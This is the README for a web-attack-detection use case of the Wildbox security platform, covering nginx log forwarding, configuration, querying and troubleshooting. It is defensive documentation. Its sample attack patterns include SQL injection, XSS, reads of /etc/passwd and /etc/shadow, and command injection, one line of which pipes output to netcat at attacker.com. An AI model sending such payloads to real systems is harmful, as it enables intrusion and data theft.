# Web Attack Detection Use Case

This use case demonstrates how to use **Wildbox** to ingest, parse, and analyze web server access logs to detect common web application attacks in real-time.

## 🎯 Overview

This example shows the **log ingestion and parsing** capabilities of Wildbox by monitoring nginx access logs for suspicious patterns that indicate potential attacks such as:

- **SQL Injection** - Attempts to manipulate database queries
- **Cross-Site Scripting (XSS)** - Injection of malicious scripts
- **Path Traversal** - Attempts to access restricted files/directories
- **Command Injection** - Attempts to execute system commands
- **Brute Force Attacks** - Repeated login failures from the same IP
- **Security Scanner Activity** - Automated vulnerability scanning tools
- **Rate Limiting Violations** - Excessive requests from a single source
- **Local/Remote File Inclusion** - Attempts to include malicious files

## 🏗️ Architecture

```text
┌─────────────────────┐
│   Web Server        │
│   (Nginx/Apache)    │
│                     │
│  access.log ────┐   │
│  error.log      │   │
└─────────────────┘   │
                      │
                      ▼
        ┌──────────────────────────┐
        │  Wildbox Sensor          │
        │  (open-security-sensor)  │
        │                          │
        │  • Log Forwarder         │
        │  • Pattern Parser        │
        │  • Event Enrichment      │
        └──────────────────────────┘
                      │
                      │ HTTPS, X-API-Key (data:ingest)
                      │ POST /api/v1/data/ingest
                      ▼
        ┌──────────────────────────┐
        │  Wildbox Gateway         │
        │  (open-security-gateway) │
        │                          │
        │  • Checks the API key    │
        │  • Forwards its team     │
        └──────────────────────────┘
                      │
                      ▼
        ┌──────────────────────────┐
        │  Wildbox Data Lake       │
        │  (open-security-data)    │
        │                          │
        │  • Stores the events     │
        │    under the key's team  │
        │  • Search & Query        │
        └──────────────────────────┘
```

The sensor never talks to the data service directly: it authenticates at the
gateway with a personal API key of a team member created for it, and the
events belong to that member's team.

## 📋 Prerequisites

1. **Wildbox Platform Running**
   - Docker and Docker Compose installed
   - Wildbox services deployed (see main [QUICKSTART.md](../../docs/guides/quickstart.md))

2. **Web Server with Logs**
   - Nginx or Apache web server running
   - Access to log files (`/var/log/nginx/access.log`)
   - Appropriate read permissions

3. **Python 3.11+** (for the sensor)

## 🚀 Quick Start

### Step 1: Start Wildbox Platform

If you haven't already, start the Wildbox platform:

```bash
cd /path/to/wildbox
docker compose up -d

# Wait for services to be healthy
docker compose ps

# The gateway answers on HTTPS with a certificate it generated; trust it
export WILDBOX_CA=$PWD/open-security-gateway/ssl/wildbox.crt
curl --cacert "$WILDBOX_CA" https://localhost/health
```

### Step 1b: Create the Sensor's Account and API Key

In the dashboard, as a team owner or admin:

1. **Settings > Team > Add member**: create a member for the sensor, for
   example `web-sensor@example.com`, with an initial password.
2. Sign in as that member and change the password when asked.
3. **Settings > API keys**: create a key with the **Telemetry Ingest**
   (`data:ingest`) scope only, and copy it; it is shown once.

```bash
export SENSOR_DATA_LAKE_API_KEY=wsk_...   # the key from step 3
```

The key can send telemetry and nothing else. Revoking it, or removing the
member from the team, stops the sensor at its next batch. The API calls for
the same steps are in the
[sensor README](../../open-security-sensor/README.md#sending-telemetry-to-wildbox).

### Step 2: Configure the Sensor

Copy and customize the sensor configuration:

```bash
cd use-cases/web-attack-detection

# Copy the configuration
cp sensor-config/config.yaml /etc/security-sensor/config.yaml

# Edit the configuration
nano /etc/security-sensor/config.yaml
```

**Important settings to update:**

```yaml
data_lake:
  endpoint: "https://localhost"            # Your gateway (HTTPS only)
  api_key: ""                              # Leave empty: set SENSOR_DATA_LAKE_API_KEY
  ca_bundle: "/path/to/wildbox/open-security-gateway/ssl/wildbox.crt"
  sensor_id: "web-server-sensor"

log_sources:
  - name: nginx_access
    type: file
    path: /var/log/nginx/access.log                # Path to your nginx logs
    format: nginx
    enabled: true
```

The sensor reads exactly the enabled sources of `log_sources`, and sends
every line they hold to Wildbox: list log files only. `path` is absolute and
may be a pattern (`/var/log/nginx/*access.log`). When the sensor starts it
logs each source and, as a warning that names the source, any file it cannot
read:

```text
Log source 'nginx_access': /var/log/nginx/access.log (format nginx, from the end of a file that already exists)
Log source 'nginx_access': reading /var/log/nginx/access.log from byte 48211
Log source 'nginx_access': /var/log/nginx/access.log is not read: this process (uid 999) is not allowed to read it
```

A file that does not exist yet is read from its beginning once it appears. A
source the sensor cannot understand (an unknown key, type or format, a
relative path) stops it at start-up with a message naming the source. The
full reference is in the
[sensor README](../../open-security-sensor/README.md#log-forwarding).

### Step 3: Test with Sample Logs

For testing without a real web server, you can use the provided sample logs:

```bash
# Create a test log directory
mkdir -p /tmp/wildbox-test/logs

# Copy sample logs
cp sample-logs/nginx-access.log /tmp/wildbox-test/logs/access.log
```

Then point the source at that file and have the sensor read what it already
holds:

```yaml
log_sources:
  - name: nginx_access
    type: file
    path: /tmp/wildbox-test/logs/access.log
    format: nginx
    read_from: beginning
```

By default (`read_from: end`) the sensor forwards only the lines written
after it starts, so the sample lines already in the file would not be sent.
`read_from: beginning` sends them, and sends them again at every restart:
the sensor does not remember across restarts how far it has read. Use it for
tests like this one, not for a production log. `quick-start.sh` writes this
configuration to `/tmp/wildbox-test-config.yaml` for you.

### Step 4: Start the Sensor

#### Option A: Using Docker

The sensor's container reads only what is mounted into it, and the compose
files mount no host log. Mount the web server's log directory, read-only,
and switch log forwarding on in the configuration the container uses.
Create `docker-compose.override.yml` next to the root `docker-compose.yml`:

```yaml
services:
  sensor:
    volumes:
      - /var/log/nginx:/host/var/log/nginx:ro
    # The container runs as uid 999, not as root. If the logs are
    # not world-readable (Debian and Ubuntu: 640, group adm), add the group
    # that may read them: stat -c %g /var/log/nginx/access.log
    group_add:
      - "4"
```

Then, in `open-security-sensor/config.yaml.example` (the file the container
mounts as its configuration), set `collection.log_forwarding: true` and add
the source, with the path as the container sees it:

```yaml
log_sources:
  - name: nginx_access
    type: file
    path: /host/var/log/nginx/access.log
    format: nginx
```

```bash
# From the Wildbox root directory, with SENSOR_DATA_LAKE_API_KEY in .env
docker compose up -d sensor

# The sensor says what it reads, and what it cannot
docker compose logs sensor | grep "Log source"
```

#### Option B: Running Locally

```bash
# Install sensor dependencies
cd ../../open-security-sensor
pip install -r requirements.txt

# Run the sensor
python main.py --config /etc/security-sensor/config.yaml
```

### Step 5: Verify Log Ingestion

First check that the gateway accepts the sensor's key:

```bash
cd ../../open-security-sensor
python main.py --config /etc/security-sensor/config.yaml --test-connection
```

Then read the telemetry back through the gateway, as a member of the same
team. The sensor's own key cannot do this (it can only ingest): use a key
with the `read` scope, here in `WILDBOX_READ_KEY`.

```bash
H="X-API-Key: $WILDBOX_READ_KEY"

# Check telemetry stats
curl --cacert "$WILDBOX_CA" -H "$H" https://localhost/api/v1/data/telemetry/stats

# View recent events
curl --cacert "$WILDBOX_CA" -H "$H" "https://localhost/api/v1/data/telemetry/events?limit=10" | jq

# Check sensor status
curl --cacert "$WILDBOX_CA" -H "$H" https://localhost/api/v1/data/sensors | jq
```

Members of other teams see none of it.

## 📊 Analyzing the Data

### View Ingested Events

Query the data service through the gateway to see ingested log events
(`$H` and `$WILDBOX_CA` as in Step 5):

```bash
API=https://localhost/api/v1/data

# The most recent telemetry events
curl --cacert "$WILDBOX_CA" -H "$H" "$API/telemetry/events?limit=100" | jq

# Log events: their type is security_event, and the log source is a tag
curl --cacert "$WILDBOX_CA" -H "$H" "$API/telemetry/events?event_type=security_event&limit=100" \
  | jq '[.[] | select(.tags | index("log.nginx_access"))]'

# Events from a specific sensor
curl --cacert "$WILDBOX_CA" -H "$H" "$API/telemetry/events?sensor_id=web-server-sensor" | jq
```

### Query Statistics

```bash
# Statistics for the last 24 hours
curl --cacert "$WILDBOX_CA" -H "$H" "$API/telemetry/stats?hours=24" | jq

# Statistics for a specific sensor
curl --cacert "$WILDBOX_CA" -H "$H" "$API/telemetry/stats?sensor_id=web-server-sensor&hours=24" | jq
```

### Example Response

When viewing events, you'll see the event the sensor collected, kept whole
in `event_data`, like:

```json
{
  "id": "6f1c2a0e-8f3b-4c55-9a51-1d2e3f405162",
  "sensor_id": "web-server-sensor",
  "event_type": "security_event",
  "timestamp": "2025-11-09T10:05:01+00:00",
  "source_host": "web-server-01",
  "event_data": {
    "source": "log_forwarder",
    "type": "log.nginx_access",
    "data": {
      "client_ip": "10.0.0.100",
      "timestamp": "09/Nov/2025:10:05:01 +0000",
      "request": "GET /products?id=1' OR '1'='1 HTTP/1.1",
      "status_code": 200,
      "response_size": 1234,
      "user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36",
      "raw_message": "10.0.0.100 - - [09/Nov/2025:10:05:01 +0000] \"GET /products?id=1' OR '1'='1 HTTP/1.1\" 200 1234 \"-\" \"Mozilla/5.0 ...\""
    },
    "metadata": {"log_source": "nginx_access", "log_file": "/var/log/nginx/access.log", "format": "nginx"},
    "host": {"hostname": "web-server-01", "platform": "Linux"}
  },
  "severity": 1,
  "tags": ["log.nginx_access"],
  "ingested_at": "2025-11-09T10:05:31+00:00",
  "processed": false,
  "processed_at": null
}
```

Detection is not done at ingestion: the events carry the raw request, and
the attack patterns below are what to look for in it.

## 🔍 Attack Patterns in Sample Logs

The provided `sample-logs/nginx-access.log` contains examples of:

### 1. SQL Injection

```http
GET /products?id=1' OR '1'='1 HTTP/1.1
GET /search?q='; DROP TABLE products;-- HTTP/1.1
```

### 2. Path Traversal

```http
GET /../../../etc/passwd HTTP/1.1
GET /download?file=../../../../etc/shadow HTTP/1.1
```

### 3. Cross-Site Scripting (XSS)

```http
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
GET /comment?text=<img src=x onerror=alert(1)> HTTP/1.1
```

### 4. Brute Force Login

```http
POST /admin/login HTTP/1.1 (repeated 10+ times with 401 responses)
```

### 5. Security Scanners

```yaml
User-Agent: sqlmap/1.7.2
User-Agent: Nikto/2.1.6
User-Agent: Acunetix Web Vulnerability Scanner
```

### 6. Command Injection

```http
GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1
GET /exec?cmd=ls -la | nc attacker.com 1234 HTTP/1.1
```

## 🔧 Configuration Options

### Log Source Formats

A `type: file` source parses each line as its `format`:

| Format | Description | Example Path |
| -------- | ------------- | -------------- |
| `nginx` | Nginx combined access log format | `/var/log/nginx/access.log` |
| `apache` | Apache combined log format | `/var/log/apache2/access.log` |
| `syslog` | Standard syslog format | `/var/log/syslog` |
| `raw` | The line as it is (the default) | `/var/log/app/*.log` |

A line the format does not match is still forwarded, as `raw_message` only.
The systemd journal is a source of its own, `type: journald`, with no path.

### Performance Tuning

Adjust these settings based on your log volume:

```yaml
data_lake:
  batch_size: 100         # Events per batch
  flush_interval: 30      # Send an incomplete batch after N seconds

performance:
  max_queue_size: 1000    # Events waiting between collection and sending
  worker_threads: 2       # Concurrent processing tasks
```

The forwarder looks at each file once a second and waits for the queue to
take each line: when Wildbox is unreachable it stops reading, and continues
from the same place in the file when it is reachable again.

### Log Filtering

The sensor forwards every line of a source: there is no per-source filter.
Narrow what is forwarded by what the source's `path` matches, and filter by
request or status when you query the events.

## 📈 Next Steps

Once you have log ingestion working, you can extend this use case:

### 1. Add AI-Powered Analysis

Use **open-security-agents** to analyze patterns and detect anomalies:

- Behavioral analysis
- Threat classification
- Attack pattern recognition
- False positive reduction

### 2. Automated Response

Use **open-security-responder** to automatically respond to threats:

- Block malicious IPs at the firewall
- Add IPs to rate limiting lists
- Send alerts to Slack/email
- Trigger incident response playbooks

### 3. Dashboard Visualization

Use **open-security-dashboard** to visualize:

- Real-time attack maps
- Top attacking IPs
- Attack type distribution
- Timeline of events

### 4. Threat Intelligence Correlation

Correlate with **open-security-data** threat feeds:

- Check attacking IPs against known bad actor lists
- Enrich events with geolocation data
- Compare attack patterns with CVE databases

## 🐛 Troubleshooting

### Sensor Not Starting

```bash
# Check sensor logs
docker compose logs sensor

# Verify configuration
docker compose exec sensor cat /etc/security-sensor/config.yaml

# Test the connection to the gateway with the configured key
docker compose exec sensor python main.py --config /etc/security-sensor/config.yaml --test-connection
```

The sensor stops at start-up with a message naming the setting when the
endpoint is not an `https://` gateway URL, the key is not an identity key
(`wsk_...`) or the CA bundle does not exist.

### No Events Being Ingested

```bash
# What does the sensor read, and what could it not read? Each source is
# logged at start-up, and a file it cannot read is a warning naming it
docker compose logs sensor | grep "Log source"

# Verify log file exists and is readable
ls -la /var/log/nginx/access.log

# Check sensor has permission to read logs (in the container: is the
# directory mounted, and can uid 999 read the file?)
docker compose exec sensor head -1 /host/var/log/nginx/access.log

# Is forwarding enabled, and what did the last batch get?
docker compose logs sensor | grep -i -E "forwarding|gateway|batch"

# Verify the data service is receiving data for your team
curl --cacert "$WILDBOX_CA" -H "$H" https://localhost/api/v1/data/telemetry/stats
```

In the sensor's log, `HTTP 401` means the key is invalid, expired or revoked,
`HTTP 403` with `insufficient_scope` that it lacks `data:ingest`, and a
certificate error that `data_lake.ca_bundle` does not hold the gateway's
certificate.

With `read_from: end`, the default, lines that were in the file before the
sensor started are not sent: write new ones, or use `read_from: beginning`
for a test. The same list of sources, the files each one is reading and its
problems are in the sensor's local API, `GET /api/v1/components`, under
`log_forwarder`.

### High Memory Usage

```yaml
# Reduce batch size and queue size in config.yaml
data_lake:
  batch_size: 50
performance:
  max_queue_size: 500
```

## 📚 Additional Resources

- [Wildbox Documentation](https://www.wildbox.io)
- [Sensor Configuration Guide](../../open-security-sensor/README.md)
- [Data Lake API Documentation](../../docs/api/data/endpoints.md)
- [Log Forwarder Source Code](../../open-security-sensor/sensor/collectors/log_forwarder.py)

## 🤝 Contributing

Found an issue or want to add more attack patterns? Contributions are welcome!

1. Add new attack patterns to `sample-logs/nginx-access.log`
2. Document the attack type and detection method
3. Submit a pull request

## 📄 License

This use case example is part of Wildbox and is licensed under the MIT License.
